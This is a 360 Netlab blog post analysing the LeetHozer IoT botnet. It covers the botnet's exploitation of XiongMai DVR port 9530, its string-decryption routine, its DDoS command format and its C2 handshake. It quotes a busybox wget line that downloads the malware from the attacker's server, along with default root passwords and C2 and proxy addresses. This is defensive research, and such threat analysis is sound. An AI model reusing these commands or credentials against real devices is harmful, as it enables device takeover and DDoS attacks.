<!DOCTYPE html>
<html lang="en">
<head>

    <title>The LeetHozer botnet</title>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="HandheldFriendly" content="True" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css?v=42b57cac00" />

    <link rel="icon" href="https://blog.netlab.360.com/content/images/size/w256h256/2019/02/netlab_xs-2.png" type="image/png">
    <link rel="canonical" href="https://blog.netlab.360.com/the-leethozer-botnet-en/">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <link rel="amphtml" href="https://blog.netlab.360.com/the-leethozer-botnet-en/amp/">
    
    <meta property="og:site_name" content="360 Netlab Blog - Network Security Research Lab at 360">
    <meta property="og:type" content="article">
    <meta property="og:title" content="The LeetHozer botnet">
    <meta property="og:description" content="Background


On March 26, 2020, we captured a suspicious sample11c1be44041a8e8ba05be9df336f9231. Although the samples have the word mirai in their names and most antivirus engines identified it as Mirai, its network traffic is totally new,which had got our attention.


The sample borrowed some of Mirai’s Reporter and Loader mechanism,">
    <meta property="og:url" content="https://blog.netlab.360.com/the-leethozer-botnet-en/">
    <meta property="og:image" content="https://blog.netlab.360.com/content/images/2019/02/astronomy-constellation-dark-998641-4.jpg">
    <meta property="article:published_time" content="2020-04-27T14:00:00.000Z">
    <meta property="article:modified_time" content="2020-04-29T01:26:39.000Z">
    <meta property="article:tag" content="Botnet">
    <meta property="article:tag" content="en">
    <meta property="article:tag" content="DDoS">
    <meta property="article:tag" content="Import 2022-11-30 11:16">
    
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="The LeetHozer botnet">
    <meta name="twitter:description" content="Background


On March 26, 2020, we captured a suspicious sample11c1be44041a8e8ba05be9df336f9231. Although the samples have the word mirai in their names and most antivirus engines identified it as Mirai, its network traffic is totally new,which had got our attention.


The sample borrowed some of Mirai’s Reporter and Loader mechanism,">
    <meta name="twitter:url" content="https://blog.netlab.360.com/the-leethozer-botnet-en/">
    <meta name="twitter:image" content="https://blog.netlab.360.com/content/images/2019/02/astronomy-constellation-dark-998641-4.jpg">
    <meta name="twitter:label1" content="Written by">
    <meta name="twitter:data1" content="Alex.Turing">
    <meta name="twitter:label2" content="Filed under">
    <meta name="twitter:data2" content="Botnet, en, DDoS, Import 2022-11-30 11:16">
    <meta name="twitter:site" content="@360Netlab">
    <meta name="twitter:creator" content="@TuringAlex">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="800">
    
    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Article",
    "publisher": {
        "@type": "Organization",
        "name": "360 Netlab Blog - Network Security Research Lab at 360",
        "url": "https://blog.netlab.360.com/",
        "logo": {
            "@type": "ImageObject",
            "url": "https://blog.netlab.360.com/content/images/2019/02/netlab-brand-5.png"
        }
    },
    "author": {
        "@type": "Person",
        "name": "Alex.Turing",
        "image": {
            "@type": "ImageObject",
            "url": "https://blog.netlab.360.com/content/images/2019/06/turing.PNG",
            "width": 1200,
            "height": 1200
        },
        "url": "https://blog.netlab.360.com/author/alex/",
        "sameAs": [
            "https://twitter.com/TuringAlex"
        ]
    },
    "headline": "The LeetHozer botnet",
    "url": "https://blog.netlab.360.com/the-leethozer-botnet-en/",
    "datePublished": "2020-04-27T14:00:00.000Z",
    "dateModified": "2020-04-29T01:26:39.000Z",
    "keywords": "Botnet, en, DDoS, Import 2022-11-30 11:16",
    "description": "Background\n\n\nOn March 26, 2020, we captured a suspicious sample11c1be44041a8e8ba05be9df336f9231. Although the samples have the word mirai in their names and most antivirus engines identified it as Mirai, its network traffic is totally new,which had got our attention.\n\n\nThe sample borrowed some of Mirai’s Reporter and Loader mechanism, but the encryption method and Bot program, as well as C2 communication protocol had been totally redesigned.\n\n\nFor regular Mirai and their variations, normally the",
    "mainEntityOfPage": "https://blog.netlab.360.com/the-leethozer-botnet-en/"
}
    </script>

    <meta name="generator" content="Ghost 5.76">
    <link rel="alternate" type="application/rss+xml" title="360 Netlab Blog - Network Security Research Lab at 360" href="https://blog.netlab.360.com/rss/">
    
    <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/sodo-search.min.js" data-key="db8c743e6bb1457403d255d83f" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/main.css" data-sodo-search="https://blog.netlab.360.com/" crossorigin="anonymous"></script>
    
    <link href="https://blog.netlab.360.com/webmentions/receive/" rel="webmention">
    <script defer src="/public/cards.min.js?v=42b57cac00"></script>
    <link rel="stylesheet" type="text/css" href="/public/cards.min.css?v=42b57cac00">
    <style type='text/css'>
	#ghost-portal-root {
        display: none;
    }
</style><style>:root {--ghost-accent-color: #eca265;}</style>

</head>
<body class="post-template tag-botnet tag-en tag-ddos tag-import-2022-11-30-11-16 has-cover">
<div class="viewport">

    <header id="gh-head" class="gh-head outer">
        <nav class="gh-head-inner inner">

            <div class="gh-head-brand">
                <a class="gh-head-logo" href="https://blog.netlab.360.com">
                        <img src="https://blog.netlab.360.com/content/images/2019/02/netlab-brand-5.png" alt="360 Netlab Blog - Network Security Research Lab at 360" />
                </a>
                <div class="gh-head-brand-wrapper">
                    <button class="gh-search" data-ghost-search><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg></button>
                    <a class="gh-burger" role="button">
                        <div class="gh-burger-box">
                            <div class="gh-burger-inner"></div>
                        </div>
                    </a>
                </div>
            </div>
            <div class="gh-head-menu">
                <ul class="nav">
    <li class="nav-botnet"><a href="https://blog.netlab.360.com/tag/botnet/">Botnet</a></li>
    <li class="nav-dnsmon"><a href="https://blog.netlab.360.com/tag/dnsmon/">DNSMon</a></li>
    <li class="nav-ddos"><a href="https://blog.netlab.360.com/tag/ddos/">DDoS</a></li>
    <li class="nav-passivedns"><a href="https://blog.netlab.360.com/tag/pdns/">PassiveDNS</a></li>
    <li class="nav-mirai"><a href="https://blog.netlab.360.com/tag/mirai/">Mirai</a></li>
    <li class="nav-dta"><a href="https://blog.netlab.360.com/tag/dta/">DTA</a></li>
</ul>

            </div>
            <div class="gh-head-actions">
                <div class="gh-social">
                        <a class="gh-social-link gh-social-twitter" href="https://twitter.com/360Netlab" title="Twitter" target="_blank" rel="me noopener"><svg class="icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="currentColor"><path d="M23.954 4.569c-.885.389-1.83.654-2.825.775 1.014-.611 1.794-1.574 2.163-2.723-.951.555-2.005.959-3.127 1.184-.896-.959-2.173-1.559-3.591-1.559-2.717 0-4.92 2.203-4.92 4.917 0 .39.045.765.127 1.124C7.691 8.094 4.066 6.13 1.64 3.161c-.427.722-.666 1.561-.666 2.475 0 1.71.87 3.213 2.188 4.096-.807-.026-1.566-.248-2.228-.616v.061c0 2.385 1.693 4.374 3.946 4.827-.413.111-.849.171-1.296.171-.314 0-.615-.03-.916-.086.631 1.953 2.445 3.377 4.604 3.417-1.68 1.319-3.809 2.105-6.102 2.105-.39 0-.779-.023-1.17-.067 2.189 1.394 4.768 2.209 7.557 2.209 9.054 0 13.999-7.496 13.999-13.986 0-.209 0-.42-.015-.63.961-.689 1.8-1.56 2.46-2.548l-.047-.02z"/></svg></a>
                        <a class="gh-social-link gh-social-feedly" href="https://feedly.com/i/subscription/feed/https://blog.netlab.360.com/rss/" title="RSS" target="_blank" rel="me noopener"><svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><circle cx="6.18" cy="17.82" r="2.18"/><path d="M4 4.44v2.83c7.03 0 12.73 5.7 12.73 12.73h2.83c0-8.59-6.97-15.56-15.56-15.56zm0 5.66v2.83c3.9 0 7.07 3.17 7.07 7.07h2.83c0-5.47-4.43-9.9-9.9-9.9z"/></svg>
</a>
                </div>
            </div>
        </nav>
    </header>

    <div class="site-content">
             <div class="floating-header">
    <div class="floating-header-logo">
        <a href="https://blog.netlab.360.com">
                <img src="/content/images/size/w30/2019/02/netlab_xs-2.png" alt="360 Netlab Blog - Network Security Research Lab at 360 icon" />
            <span>360 Netlab Blog - Network Security Research Lab at 360</span>
        </a>
    </div>
    <span class="floating-header-divider">&mdash;</span>
    <div class="floating-header-title">The LeetHozer botnet</div>
    <div class="floating-header-share">
        <div class="floating-header-share-label">Share this <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
    <path d="M7.5 15.5V4a1.5 1.5 0 1 1 3 0v4.5h2a1 1 0 0 1 1 1h2a1 1 0 0 1 1 1H18a1.5 1.5 0 0 1 1.5 1.5v3.099c0 .929-.13 1.854-.385 2.748L17.5 23.5h-9c-1.5-2-5.417-8.673-5.417-8.673a1.2 1.2 0 0 1 1.76-1.605L7.5 15.5zm6-6v2m-3-3.5v3.5m6-1v2"/>
</svg>
</div>
        <a class="floating-header-share-tw" href="https://twitter.com/share?text=The%20LeetHozer%20botnet&amp;url=https://blog.netlab.360.com/the-leethozer-botnet-en/"
            onclick="window.open(this.href, 'share-twitter', 'width=550,height=235');return false;">
            <svg class="icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="currentColor"><path d="M23.954 4.569c-.885.389-1.83.654-2.825.775 1.014-.611 1.794-1.574 2.163-2.723-.951.555-2.005.959-3.127 1.184-.896-.959-2.173-1.559-3.591-1.559-2.717 0-4.92 2.203-4.92 4.917 0 .39.045.765.127 1.124C7.691 8.094 4.066 6.13 1.64 3.161c-.427.722-.666 1.561-.666 2.475 0 1.71.87 3.213 2.188 4.096-.807-.026-1.566-.248-2.228-.616v.061c0 2.385 1.693 4.374 3.946 4.827-.413.111-.849.171-1.296.171-.314 0-.615-.03-.916-.086.631 1.953 2.445 3.377 4.604 3.417-1.68 1.319-3.809 2.105-6.102 2.105-.39 0-.779-.023-1.17-.067 2.189 1.394 4.768 2.209 7.557 2.209 9.054 0 13.999-7.496 13.999-13.986 0-.209 0-.42-.015-.63.961-.689 1.8-1.56 2.46-2.548l-.047-.02z"/></svg>        </a>
        <a class="floating-header-share-fb" href="https://www.facebook.com/sharer/sharer.php?u=https://blog.netlab.360.com/the-leethozer-botnet-en/"
            onclick="window.open(this.href, 'share-facebook','width=580,height=296');return false;">
            <svg class="icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="currentColor"><path d="M23.9981 11.9991C23.9981 5.37216 18.626 0 11.9991 0C5.37216 0 0 5.37216 0 11.9991C0 17.9882 4.38789 22.9522 10.1242 23.8524V15.4676H7.07758V11.9991H10.1242V9.35553C10.1242 6.34826 11.9156 4.68714 14.6564 4.68714C15.9692 4.68714 17.3424 4.92149 17.3424 4.92149V7.87439H15.8294C14.3388 7.87439 13.8739 8.79933 13.8739 9.74824V11.9991H17.2018L16.6698 15.4676H13.8739V23.8524C19.6103 22.9522 23.9981 17.9882 23.9981 11.9991Z"/></svg>        </a>
    </div>
    <progress id="reading-progress" class="progress" value="0">
        <div class="progress-container">
            <span class="progress-bar"></span>
        </div>
    </progress>
</div>


  <main id="site-main" class="site-main">
    <article class="article post tag-botnet tag-en tag-ddos tag-import-2022-11-30-11-16 no-image ">

      <header class="article-header gh-canvas">

        <div class="article-tag post-card-tags">
          <span class="post-card-primary-tag">
            <a href="/tag/botnet/">Botnet</a>
          </span>
        </div>

        <h1 class="article-title">The LeetHozer botnet</h1>


        <div class="article-byline">
          <section class="article-byline-content">

            <ul class="author-list">
              <li class="author-list-item">
                <a href="/author/alex/" class="author-avatar">
                  <img class="author-profile-image" src="/content/images/2019/06/turing.PNG" alt="Alex.Turing" />
                </a>
              </li>
              <li class="author-list-item">
                <a href="/author/huiwang/" class="author-avatar">
                  <img class="author-profile-image" src="/content/images/2017/05/WechatIMG1.jpeg" alt="Hui Wang" />
                </a>
              </li>
            </ul>

            <div class="article-byline-meta">
              <h4 class="author-name"><a href="/author/alex/">Alex.Turing</a>, <a href="/author/huiwang/">Hui Wang</a></h4>
              <div class="byline-meta-content">
                <time class="byline-meta-date" datetime=" 2020-04-27">Apr 27, 2020</time>
                <span class="byline-reading-time"><span class="bull">&bull;</span> 11 min read</span>
              </div>
            </div>

          </section>
        </div>


      </header>

      <section class="gh-content gh-canvas">
        <!--kg-card-begin: markdown--><h2 id="background">Background</h2>
<p>On March 26, 2020, we captured a suspicious sample<code>11c1be44041a8e8ba05be9df336f9231</code>. Although the samples have the word mirai in their names and most antivirus engines identified it as Mirai, its network traffic is totally new,which had got our attention.</p>
<p>The sample borrowed some of Mirai’s Reporter and Loader mechanism, but the encryption method and Bot program, as well as C2 communication protocol had been totally redesigned.</p>
<p>For regular Mirai and their variations, normally the changes are fairly minor, changing C2s or encryption keys, or integrate some new vulnerabilities, nothing dramatic.</p>
<p>But this one is different. Its encryption method is unique, and communication protocol is more rigorous. Also it is very likely a new branch from the Moobot group and is in active development. (the author released a third version while we work on this article, adding some new function and changing Tor C2 :<code>vbrxmrhrjnnouvjf.onion:31337</code>)</p>
<p>So we think we should blog it and decide to name it LeetHozer because of  the<code>H0z3r</code> string(<code>/bin/busybox wget http://37[.49.226.171:80/bins/mirai.m68k -O - &gt; H0z3r;</code>)</p>
<p>The targets devices currently observed are mainly <a href="http://www.xiongmaitech.com/en/index.php/news/info/12/68?ref=blog.netlab.360.com">XiongMai H.264 and H.265 devices</a>.</p>
<h2 id="propagation">Propagation</h2>
<ul>
<li>In 2017, security researchers disclosed the vulnerability<a href="https://www.cnblogs.com/mmseh/p/6537924.html?ref=blog.netlab.360.com">[2]</a>.</li>
<li>2020-02-04 POC was released on github<a href="https://habr.com/en/post/486856/?ref=blog.netlab.360.com">[3]</a>。<a href="https://github.com/Snawoot/hisilicon-dvr-telnet?ref=blog.netlab.360.com">[4]</a>.</li>
<li>2020-02-11 We saw a <a href="https://blog.netlab.360.com/the-botnet-cluster-on-185-244-25-0-24-en/">moobot</a> variant we called <code>moobot_xor</code> exploiting this vulnerability.</li>
<li>2020-03-26 <code>LeetHozer</code> began to exploit the vulnerability.</li>
</ul>
<p>LeetHozer takes advantage of the vulnerability through the target device's TCP 9530 port to start the telnetd service, then  login to the device with the default password to complete the infection process. The propagation process is shown in the figure:<br>
<a href="https://blog.netlab.360.com/content/images/2020/04/hozer_flow.png"><img src="https://blog.netlab.360.com/content/images/2020/04/hozer_flow.png" class="kg-image"></a></p>
<p>The source IP currently exploiting the vulnerability is around 4.5k per day.<br>
<a href="https://blog.netlab.360.com/content/images/2020/04/dvr.9530.png"><img src="https://blog.netlab.360.com/content/images/2020/04/dvr.9530.m.png" class="kg-image"></a></p>
<p>LeetHozer and moobot_xor used the same unique string <code>/bin/busybox DNXXXFF</code>  in their 9530 exploit. We also observed that at times they used the exact same downloader, so we speculate that moobot_xor and LeetHozer probably belong to the same organization or individual.</p>
<p>The time periods and the downloader shared by the two families are as follows:</p>
<pre><code>date=2020-03-26 08:11:46+08:00  md5=11c1be44041a8e8ba05be9df336f9231    family_name=LeetHozer   url=http://185.172[.110.224/ab/i686
date=2020-03-26 08:11:39+08:00  md5=11c1be44041a8e8ba05be9df336f9231    family_name=LeetHozer   url=http://185.172[.110.224/ab/i586
date=2020-03-26 08:11:39+08:00  md5=b7b2ae292bf182b0d91535770394ad93    family_name=moobot_xor  url=http://185.172[.110.224/ab/arm
</code></pre>
<h2 id="therecentleethozerddostargetswecurrentlysee">The recent LeetHozer DDos targets we currently see</h2>
<pre><code>2020-04-07	37.49.226.171         	31337	ddos	tcpraw  	45.83.128.252  	ASN40676 	Psychz_Networks
2020-04-07	37.49.226.171         	31337	ddos	udpplain	172.106.18.210 	ASN40676 	Psychz_Networks
2020-04-08	37.49.226.171         	31337	ddos	udpplain	185.172.110.224	ASN206898	Server_Hosting_Pty_Ltd
2020-04-11	w6gr2jqz3eag4ksi.onion	31337	ddos	icmpecho	185.38.151.161 	ASN25369 	Hydra_Communications_Ltd
2020-04-13	37.49.226.171         	31337	ddos	icmpecho	73.99.44.254   	ASN7922  	Comcast_Cable_Communications,_LLC
2020-04-13	37.49.226.171         	31337	ddos	icmpecho	94.174.77.69   	ASN5089  	Virgin_Media_Limited
2020-04-13	37.49.226.171         	31337	ddos	udppplain	94.174.77.69   	ASN5089  	Virgin_Media_Limited
2020-04-16	37.49.226.171         	31337	ddos	icmpecho	117.27.239.28  	ASN133774	Fuzhou
2020-04-16	37.49.226.171         	31337	ddos	icmpecho	185.172.110.224	ASN206898	Server_Hosting_Pty_Ltd
2020-04-16	37.49.226.171         	31337	ddos	icmpecho	52.47.76.48    	ASN16509 	Amazon.com,_Inc.
2020-04-16	37.49.226.171         	31337	ddos	tcpraw  	117.27.239.28  	ASN133774	Fuzhou
2020-04-16	37.49.226.171         	31337	ddos	tcpraw  	162.248.93.234 	ASN32374 	Nuclearfallout_Enterprises,_Inc.
2020-04-16	37.49.226.171         	31337	ddos	udpplain	71.222.69.77   	ASN209   	CenturyLink_Communications,_LLC
2020-04-17	37.49.226.171         	31337	ddos	udpplain	117.27.239.28  	ASN133774	Fuzhou
2020-04-18	37.49.226.171         	31337	ddos	tcpraw  	76.164.193.89  	ASN36114 	Versaweb,_LLC
2020-04-18	37.49.226.171         	31337	ddos	udpplain	117.27.239.28  	ASN133774	Fuzhou
2020-04-18	37.49.226.171         	31337	ddos	udpplain	66.150.188.101 	ASN32374 	Nuclearfallout_Enterprises,_Inc.
2020-04-19	37.49.226.171         	31337	ddos	tcpraw  	117.27.239.28  	ASN133774	Fuzhou
2020-04-19	37.49.226.171         	31337	ddos	udpplain	108.61.22.86   	ASN20473 	Choopa,_LLC
2020-04-19	37.49.226.171         	31337	ddos	udpplain	108.61.33.194  	ASN20473 	Choopa,_LLC
2020-04-19	37.49.226.171         	31337	ddos	udpplain	172.107.228.198	ASN40676 	Psychz_Networks
2020-04-19	37.49.226.171         	31337	ddos	udpplain	192.99.226.11  	ASN16276 	OVH_SAS
2020-04-19	37.49.226.171         	31337	ddos	udpplain	209.58.147.245 	ASN394380	Leaseweb_USA,_Inc.
2020-04-19	37.49.226.171         	31337	ddos	udpplain	24.46.209.115  	ASN6128  	Cablevision_Systems_Corp.
2020-04-19	37.49.226.171         	31337	ddos	udpplain	71.222.69.77   	ASN209   	CenturyLink_Communications,_LLC
2020-04-20	37.49.226.171         	31337	ddos	udpplain	139.28.218.180 	ASN9009  	M247_Ltd
2020-04-20	37.49.226.171         	31337	ddos	udpplain	74.91.122.90   	ASN14586 	Nuclearfallout_Enterprises,_Inc.
2020-04-23	37.49.226.171         	31337	ddos	icmpecho	162.244.55.107 	ASN49544 	i3D.net_B.V
2020-04-23	37.49.226.171         	31337	ddos	udpplain	162.244.55.107 	ASN49544 	i3D.net_B.V
</code></pre>
<h2 id="reverseanalysis">Reverse analysis</h2>
<p>At present, there are three versions of LeetHozer samples (We are going to focus on V2 as V3 is in development now). The difference between V1 and V2 is mainly that V2 supports more DDos attack methods.<br>
<a href="https://blog.netlab.360.com/content/images/2020/04/hozer_version.png"><img src="https://blog.netlab.360.com/content/images/2020/04/hozer_version.png" class="kg-image"></a><br>
We are going to take a quick look at the sample’s behavior, DDos command format, network communication below.</p>
<blockquote>
<p>MD5:		57212f7e253ecebd39ce5a8a6bd5d2df</p>
<p>ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, stripped</p>
<p>Packer:	None</p>
<p>Library: uclibc</p>
<p>Version: V2</p>
</blockquote>
<h3 id="samplebehavior">Sample behavior</h3>
<p>The function of LeetHozer is relatively simple, when it runs on infected device, it operates the watchdog device,then write the pid to a file named <code>.1</code>, and prints out <code>/bin/sh:./a.out:not found</code> string to the console( to confuse the user?). After that, it starts to scan internet to find more devices with open port 9530, and try to use the vulnerability to open the telnetd service on more victim devices.</p>
<p>The sample also reports the infected device information to the reporter, and establishes communication with C2, waiting for instructions to launch DDos attack.</p>
<p>The sample uses a custom algorithm for encryptiton. The decryption algorithm is as follows:</p>
<pre><code>xorkey=&quot;qE6MGAbI&quot;

def decode_str(ctxt):
    for i in range(0,len(xorkey)):
        plain=&quot;&quot;
        size=len(ctxt)    
        for idx in range(0, size):
            ch=ord(ctxt[idx]) 
            ch ^=(ord(xorkey[i]) + idx )
            plain += chr(ch)
        ctxt=plain
    return ctxt
</code></pre>
<p>After decryption, the key information is as follows, including the watchdog devices, C2 to be operated by the Bot. The information will only be decrypted when it is needed by the bot.</p>
<table>
<thead>
<tr>
<th><strong>.1</strong></th>
<th><strong>/dev/watchdog</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>/dev/misc/watchdog</strong></td>
<td><strong>/bin/sh: ./a.out: not found</strong></td>
</tr>
<tr>
<td><strong>w6gr2jqz3eag4ksi.onion</strong></td>
<td></td>
</tr>
</tbody>
</table>
<p>The specific implementation of the Bot function is as follows:，</p>
<ol>
<li>
<p>Set watchdog to prevent device restart<br>
<a href="https://blog.netlab.360.com/content/images/2020/04/hozer_dog-1.png"><img src="https://blog.netlab.360.com/content/images/2020/04/hozer_dog-1.png" class="kg-image"></a></p>
</li>
<li>
<p>Bot singleton through PID file<br>
<a href="https://blog.netlab.360.com/content/images/2020/04/hozer_pid-1.png"><img src="https://blog.netlab.360.com/content/images/2020/04/hozer_pid-1.png" class="kg-image"></a></p>
</li>
<li>
<p>Scan, exploitation and report information</p>
<ul>
<li>
<p>mirai's fast port scan technique has been borrowed, the scanned port is 9530<br>
<a href="https://blog.netlab.360.com/content/images/2020/04/hozer_scan.png"><img src="https://blog.netlab.360.com/content/images/2020/04/hozer_scan.png" class="kg-image"></a></p>
</li>
<li>
<p>Use the vulnerability to enable the telnetd service and try to log in with the following credentials.</p>
<pre><code>root:xc3511
root:xmhdipc
root:klv123
root:123456
root:jvbzd
root:hi3518
root:tsgoingon
</code></pre>
</li>
<li>
<p>Report device information after successful login<br>
<a href="https://blog.netlab.360.com/content/images/2020/04/hozer_report.png"><img src="https://blog.netlab.360.com/content/images/2020/04/hozer_report.png" class="kg-image"></a></p>
</li>
</ul>
</li>
<li>
<p>Receive the C2 command and prepare for DDos attack. The attack commands supported by different versions are different.</p>
<table>
<thead>
<tr>
<th>version</th>
<th>command</th>
</tr>
</thead>
<tbody>
<tr>
<td>V1</td>
<td>tcpraw</td>
</tr>
<tr>
<td>v2</td>
<td>tcpraw;icmpecho;udpplain</td>
</tr>
</tbody>
</table>
<p>However, the data format of the attack command is the same, and its structure is <code>Header(6 bytes),Option1,Option2...</code>，in which the structure of Option is<code>Type(2 bytes),Len(2 bytes),Subtype(2 bytes),Contents( Len bytes),Padding</code>, the following takes an actual attack command as an example to explain the parsing process.</p>
<pre><code>00000000: 3E 00 3F 00 3A 00 01 00  08 00 04 00 75 64 70 70  &gt;.?.:.......udpp
00000010: 6C 61 69 6E 00 00 00 00  01 00 0E 00 06 00 31 33  lain..........13
00000020: 39 2E 32 38 2E 32 31 38  2E 31 38 30 00 00 00 00  9.28.218.180....
00000030: 02 00 01 00 0C 00 50 00  02 00 01 00 05 00 64 00  ......P.......d.
----------------------------------------------------------------------------
Header: 	3E 00 3F 00 3A 00, ----Little endian 
				0x003E		---- xor key
				0x003A		---- 0x3A xor 0x3E = 4 个Option
Opt 1:		01 00 08 00 04 00, ----Little endian 
				0x0001		----Type 1,Padding 4 bytes
				0x0008		----Content length,len(&quot;udpplain&quot;) = 8
				0x0004		----Subtype 4,Contents为attack vector
			Contents: udpplain
			Padding: 00 00 00 00
			
Opt 2:		01 00 0E 00 06 00, ----Little endian 
				0x0001		----Type 1,Padding 4 bytes
				0x000e		----Content length
				0x0006		----Subtype 6,Contents为attack target
             Contents: 139.28.218.180
             Padding: 00 00 00 00
			
Opt 3:		02 00 01 00 0c 00, ----Little endian 
				0x0002		----Type 2,No Padding
				0x0001		----Type 2 Ignore this field，Contents length is always 2 bytes
             0x000c		----Subtype 0xc,Contents为target port
             Contents: 80

Opt 4:		02 00 01 00 05 00, ----Little endian 
				0x0002		----Type 2,No Padding
				0x0001		----Type 2 Ignore this field，Contents length is always 2 bytes
				0x0005		----Subtype 0x05,Contents is attack duration
             Contents: 0x0064
</code></pre>
</li>
</ol>
<h3 id="communicationprotocols">Communication protocols</h3>
<p>Two types of C2: Tor-C2 and IP-C2 has been used. The V2 version has both existed but the code branch where Tor-C2 is located will not be executed. It is likely the V2 version is not final yet.</p>
<ol>
<li>
<p>Tor-C2，supported by V1，Not used in V2.</p>
<pre><code>  w6gr2jqz3eag4ksi.onion:31337
</code></pre>
</li>
<li>
<p>IP-C2，supported by V2.</p>
<pre><code>37.49.226.171:31337
</code></pre>
</li>
</ol>
<p>Tor-C2 has a pre-process to establish a connection through Tor proxy. After the connection between Bot and C2 is established, it takes two rounds of interaction for the bot to successfully go online.</p>
<ul>
<li>
<p>Establish a connection with C2 through Tor proxy<br>
<a href="https://blog.netlab.360.com/content/images/2020/04/hozer_proxy.png"><img src="https://blog.netlab.360.com/content/images/2020/04/hozer_proxy.png" class="kg-image"></a></p>
<p>The hardcode proxy list:</p>
<pre><code>   45.82.176.194:9034
   91.236.251.131:9712
   18.177.13.247:443
   62.109.8.218:8888
   82.99.213.98:9191
   35.225.55.174:9251
   194.99.22.206:9050
   45.147.199.142:8060
   47.104.188.20:8999
   54.149.179.115:9050
   195.128.102.178:9050
   185.176.25.66:9002
   54.188.106.141:9080
   193.47.35.56:10000
   88.193.137.205:9050
   134.209.84.21:9119
   194.58.111.244:9050
   192.99.161.66:9050
   193.47.35.53:9090
   167.179.74.97:9251
   185.30.228.141:9050
</code></pre>
</li>
<li>
<p>First round of interaction</p>
<p>The packet length sent by the Bot is 255 bytes, the first 32 bytes are valid data, and the data is interpreted in little-endian way.<br>
<a href="https://blog.netlab.360.com/content/images/2020/04/hozer_roundone.png"><img src="https://blog.netlab.360.com/content/images/2020/04/hozer_roundone.png" class="kg-image"></a></p>
<p>The meaning of some key fields</p>
<table>
<thead>
<tr>
<th>offset</th>
<th>length</th>
<th>content</th>
<th>field meaning</th>
</tr>
</thead>
<tbody>
<tr>
<td>0x00</td>
<td>2 bytes</td>
<td>0x8f49</td>
<td>source port</td>
</tr>
<tr>
<td>0x02</td>
<td>2 bytes</td>
<td>0x7a69</td>
<td>hardcode</td>
</tr>
<tr>
<td>0x04</td>
<td>4 bytes</td>
<td>0x00004818</td>
<td>hardcode</td>
</tr>
<tr>
<td>0x0e</td>
<td>2 bytes</td>
<td>0x0001</td>
<td>first  round</td>
</tr>
<tr>
<td>0x14</td>
<td>4 bytes</td>
<td>0x0051cc</td>
<td>checksum</td>
</tr>
</tbody>
</table>
<p>The calculation of checksum is as follows</p>
<pre><code>step 1: calc the sum of the first 12 WORD
		(0x8f49+0x7a69+0x4818+0x0000+0x0000+0x0000
		+0x0001+0x0000+0x0000+0x0000+0x000+0x0000) = 0x000151CB;
step 2:(HWORD(sum) + LWORD(sum)) &gt;&gt; 16
		(0x0001+0x51CB) &gt;&gt; 16 = 0;
step 3:(HWORD(sum) + LWORD(sum)) &amp;&amp; 0Xffff
		(0x0001+0x51cb) &amp;&amp; 0xffff = 0x000051cc
</code></pre>
<p>The first 32 bytes of the C2 reply packet are valid data. The packet length is 255 bytes,interpreted in little-endian way. The Bot will check the two valid flags. When the check passes, part of the data will be used for the second round of interaction.<br>
<a href="https://blog.netlab.360.com/content/images/2020/04/hozer_roundonec.png"><img src="https://blog.netlab.360.com/content/images/2020/04/hozer_roundonec.png" class="kg-image"></a></p>
<table>
<thead>
<tr>
<th>offset</th>
<th>length</th>
<th>content</th>
<th>field meaning</th>
</tr>
</thead>
<tbody>
<tr>
<td>0x04</td>
<td>4 bytes</td>
<td>0x000070f1</td>
<td>valid flag1</td>
</tr>
<tr>
<td>0x08</td>
<td>4 bytes</td>
<td>0x00004819</td>
<td>valid flag2</td>
</tr>
</tbody>
</table>
</li>
<li>
<p>Second round of interaction</p>
<p>The packet length sent by the Bot is 255 bytes, the first 32 bytes are valid data, and the data is interpreted in little-endian way. Most of the data comes from the C2 return packets from the previous step.<br>
<a href="https://blog.netlab.360.com/content/images/2020/04/hozer_roundtwo.png"><img src="https://blog.netlab.360.com/content/images/2020/04/hozer_roundtwo.png" class="kg-image"></a></p>
<table>
<thead>
<tr>
<th>offset</th>
<th>length</th>
<th>content</th>
<th>field meaning</th>
</tr>
</thead>
<tbody>
<tr>
<td>0x00</td>
<td>8 bytes</td>
<td>0x7a697a69,0x000070f1</td>
<td>C2 reply in the round 1</td>
</tr>
<tr>
<td>0x08</td>
<td>4 bytes</td>
<td>0x000070f2</td>
<td>hardcode</td>
</tr>
<tr>
<td>0x0e</td>
<td>2 bytes</td>
<td>0x0002</td>
<td>second round</td>
</tr>
<tr>
<td>0x14</td>
<td>4 bytes</td>
<td>0x00d665</td>
<td>checksum</td>
</tr>
</tbody>
</table>
<p>The 32 bytes before the C2 reply packet are valid data. The packet length is 255 bytes,interpreted in little-endian way. The Bot will check two valid flags. When the check passes, the Bot's online process is completed.<br>
<a href="https://blog.netlab.360.com/content/images/2020/04/hozer_roundtwoc.png"><img src="https://blog.netlab.360.com/content/images/2020/04/hozer_roundtwoc.png" class="kg-image"></a></p>
<table>
<thead>
<tr>
<th>offset</th>
<th>length</th>
<th>content</th>
<th>field meaning</th>
</tr>
</thead>
<tbody>
<tr>
<td>0x04</td>
<td>4 bytes</td>
<td>0x00002775</td>
<td>valid flag1</td>
</tr>
<tr>
<td>0x08</td>
<td>4 bytes</td>
<td>0x000070f2</td>
<td>valid flag2</td>
</tr>
</tbody>
</table>
</li>
</ul>
